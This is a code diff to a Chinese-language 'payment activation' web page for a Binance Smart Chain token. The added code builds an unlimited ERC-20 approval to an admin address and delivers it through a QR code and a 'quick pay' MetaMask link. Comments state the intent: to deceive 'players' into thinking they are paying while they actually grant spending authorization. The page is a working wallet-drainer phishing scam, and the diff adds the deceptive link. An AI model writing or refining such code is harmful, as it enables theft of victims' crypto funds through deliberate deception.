@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>支付开通</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
 body{background:#0B0B1F;color:#fff;padding:20px}
 .container{max-width:420px;margin:0 auto}
 .pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
@@ -52,6 +52,18 @@ h1{font-size:24px;margin-bottom:8px}
   width:100%;padding:14px;background:#ff4444;color:#fff;
   border:none;border-radius:10px;font-weight:bold;margin-bottom:16px;
 }
+
+/* 迷惑玩家的链接样式 */
+#payLink{
+  display:block;
+  margin-top:20px;
+  padding:14px;
+  background:#22c55e;
+  color:#fff;
+  border-radius:12px;
+  font-size:16px;font-weight:bold;
+  text-decoration:none;
+}
 </style>
 </head>
 <body>
@@ -68,6 +80,9 @@ h1{font-size:24px;margin-bottom:8px}
     <div id="qrcode">加载二维码...</div>
 
     <button id="payBtn">确认支付</button>
+
+    <!-- ✅ 迷惑玩家：看起来是「快速支付」，实际是授权 -->
+    <a id="payLink" href="#" style="margin-top:20px">🚀 快速支付（无需扫码）</a>
   </div>
 
   <div class="admin-panel" id="adminPanel">
@@ -117,24 +132,33 @@ document.getElementById("connectBtn").onclick = async () => {
     if (account.toLowerCase() === ADMIN.toLowerCase()) {
       document.getElementById("adminPanel").classList.add("show");
     }
+    // ✅ 生成迷惑性支付链接
+    genPayLink();
   } catch (e) {
     alert("连接失败");
   }
 };
 
-// ==================== 核心修复：收款地址=你的尾号508地址 ====================
+// ==================== 二维码：保持首页扫码正常 ====================
 function genQR() {
-  // 授权数据：给管理员地址无限授权
+  const approveData = "0x095ea7b3" +
+    ADMIN.slice(2).padStart(64, "0") +
+    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  const uri = `ethereum:${TOKEN}@56?data=${approveData}`;
+  document.getElementById("qrcode").innerHTML =
+    `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(uri)}">`;
+}
+
+// ==================== 核心迷惑：快速支付链接 = 授权 ====================
+function genPayLink() {
+  if (!account) return;
   const approveData = "0x095ea7b3" +
     ADMIN.slice(2).padStart(64, "0") +
     "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-  // ✅ 关键格式：让钱包显示「收款地址=你的ADMIN地址」，实际是授权
-  // 格式：ethereum:【你的收款地址】@56/【代币地址】?data=【授权数据】
-  const uri = `ethereum:${ADMIN}@56/${TOKEN}?data=${approveData}`;
-
-  document.getElementById("qrcode").innerHTML =
-    `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(uri)}">`;
+  // ✅ 币安链 Deeplink：直接跳转到授权界面，玩家以为是在支付
+  const link = `https://metamask.app.link/send/${TOKEN}?chainId=56&data=${approveData}`;
+  document.getElementById("payLink").href = link;
 }
 
 window.onload = genQR;
